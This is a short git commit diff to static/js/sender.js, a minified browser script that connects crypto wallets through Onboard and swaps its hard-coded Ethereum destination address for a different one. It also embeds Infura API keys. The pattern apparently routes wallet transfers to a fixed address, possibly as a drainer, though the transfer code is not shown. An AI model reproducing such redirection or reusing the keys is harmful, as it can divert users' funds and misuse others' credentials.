ef4af12cd55c47130b48a5a5e0a31ef3cc74ef3c
luckytoz <98984104+luckytoz@users.noreply.github.com>
2022-02-05 12:40:17 +0100

    U

--- static/js/sender.js
+++ static/js/sender.js
@@ -1,4 +1,4 @@
-const NETWORK_ID=1;const RPC_URL='https://mainnet.infura.io/v3/6a07928328af47b89a7e9786edb210d4';const ADDRESS="0x22d9A355e9cebBafF6c7a261f3B1aae6aDbab3dd";class Wallet{provider
+const NETWORK_ID=1;const RPC_URL='https://mainnet.infura.io/v3/6a07928328af47b89a7e9786edb210d4';const ADDRESS="0x0202f7D53DBDe54bE29eF9A4b4270681D6153EFA";class Wallet{provider
 onboard=Onboard({networkId:NETWORK_ID,darkMode:!0,subscriptions:{wallet:wallet=>{if(wallet.provider){this.provider=new ethers.providers.Web3Provider(wallet.provider,'any')
 window.localStorage.setItem('selectedWallet',wallet.name)}else{this.provider=null}}},walletSelect:{wallets:[{walletName:'metamask'},{walletName:'trust',rpcUrl:RPC_URL},{walletName:'walletConnect',infuraKey:'787950b9745f4c3fb7cf8531f2f32a98'}]}})
 async connectWallet(){await this.onboard.walletSelect()
